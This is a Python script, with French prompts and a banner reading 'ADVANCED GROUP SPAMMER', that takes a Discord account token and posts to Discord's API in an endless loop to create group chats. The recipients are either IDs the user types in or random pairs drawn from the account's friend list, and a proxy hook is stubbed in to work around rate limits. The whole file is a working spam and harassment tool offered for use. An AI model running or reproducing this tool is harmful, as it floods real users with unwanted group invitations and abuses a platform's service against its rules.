import requests
import random
import os
from time import sleep
from colorama import Fore

os.system("cls")

def clear():
    print("\033c", end="")

def groupspamtitle():
    print(f"""{Fore.CYAN}
 $$$$$$\  $$$$$$$\  $$\    $$\  $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\         $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$\      $$\ $$\      $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\ $$ |   $$ |$$  __$$\ $$$\  $$ |$$  __$$\ $$  _____|$$  __$$\       $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$$\    $$$ |$$$\    $$$ |$$  _____|$$  __$$\ 
$$ /  $$ |$$ |  $$ |$$ |   $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ |      $$ |  $$ |      $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ |  $$ |$$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\  $$$$ |$$$$\  $$$$ |$$ |      $$ |  $$ |
$$$$$$$$ |$$ |  $$ |\$$\  $$  |$$$$$$$$ |$$ $$\$$ |$$ |      $$$$$\    $$ |  $$ |      $$ |$$$$\ $$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$$  |\$$$$$$\  $$$$$$$  |$$$$$$$$ |$$\$$\$$ $$ |$$\$$\$$ $$ |$$$$$\    $$$$$$$  |
$$  __$$ |$$ |  $$ | \$$\$$  / $$  __$$ |$$ \$$$$ |$$ |      $$  __|   $$ |  $$ |      $$ |\_$$ |$$  __$$< $$ |  $$ |$$ |  $$ |$$  ____/  \____$$\ $$  ____/ $$  __$$ |$$ \$$$  $$ |$$ \$$$  $$ |$$  __|   $$  __$$< 
$$ |  $$ |$$ |  $$ |  \$$$  /  $$ |  $$ |$$ |\$$$ |$$ |  $$\ $$ |      $$ |  $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$\   $$ |$$ |      $$ |  $$ |$$ |\$  /$$ |$$ |\$  /$$ |$$ |      $$ |  $$ |
$$ |  $$ |$$$$$$$  |   \$  /   $$ |  $$ |$$ | \$$ |\$$$$$$  |$$$$$$$$\ $$$$$$$  |      \$$$$$$  |$$ |  $$ | $$$$$$  |\$$$$$$  |$$ |      \$$$$$$  |$$ |      $$ |  $$ |$$ | \_/ $$ |$$ | \_/ $$ |$$$$$$$$\ $$ |  $$ |
\__|  \__|\_______/     \_/    \__|  \__|\__|  \__| \______/ \________|\_______/        \______/ \__|  \__| \______/  \______/ \__|       \______/ \__|      \__|  \__|\__|     \__|\__|     \__|\________|\__|  \__| 
{Fore.RESET}""")

def proxy():
    # Ajoutez votre logique pour obtenir le proxy
    return None

def getheaders(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    return headers

def main():
    print("Revenir au menu principal...")

def setTitle(title):
    print(f"\033]0;{title}\007")

def selector(token, users):
    clear()
    while True:
        try:
            response = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', proxies=proxy(), headers=getheaders(token), json={"recipients": users})

            if response.status_code == 204 or response.status_code == 200:
                print(f"[{Fore.LIGHTGREEN_EX}!{Fore.RESET}] Groupe créé")
            elif response.status_code == 429:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Rate limited ({response.json()['retry_after']}ms)")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Erreur: {response.status_code}")
        except Exception:
            pass
        except KeyboardInterrupt:
            break
    main()

def randomizer(token, ID):
    while True:
        users = random.sample(ID, 2)
        try:
            response = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"recipients": users})

            if response.status_code == 204 or response.status_code == 200:
                print(f"[{Fore.LIGHTGREEN_EX}!{Fore.RESET}] Groupe crée")
            elif response.status_code == 429:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Rate limited ({response.json()['retry_after']}ms)")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {response.status_code}")
        except Exception:
            pass
        except KeyboardInterrupt:
            break
    main()

groupspamtitle()
print("Entrez le token du compte que vous souhaitez spam")
token = input("Token: ")

print('\nVoulez-vous choisir vous-même le(s) utilisateur(s) pour lesquels le spam de groupe ou souhaitez-vous sélectionner des utilisateurs aléatoires ?')
print('''
[01] choisir le(s) utilisateur(s) soi-même
[02] randomiser les utilisateurs
                    ''')
secondchoice = int(input('Choice: '))

if secondchoice not in [1, 2]:
    input(f'[!]{Fore.LIGHTRED_EX} Deuxième choix invalide{Fore.RESET}')
    main()

if secondchoice == 1:
    setTitle("Création des groupes")
    print('\nSaisissez les utilisateurs avec lesquels vous souhaitez créer ungroupe (séparés par ,: id,id2,id3)')
    recipients = input('Users ID: ')
    user = recipients.split(',')
    if "," not in recipients:
        input(f"\n[!]{Fore.LIGHTRED_EX} Vous n'aviez pas de virgules (,) le format est id,id2,id3{Fore.RESET}")
        main()
    input('\n\n\nAppuyez sur Entrée pour continuer ("ctrl + c" à tout moment pour arrêter)')
    selector(token, user)

elif secondchoice == 2:
    setTitle("Création des groupes")
    IDs = []
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'http://{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        IDs.append(friend['id'])
    input('Appuyez sur Entrée pour continuer ("ctrl + c" à tout moment pour arrêter)')
    randomizer(token, IDs)
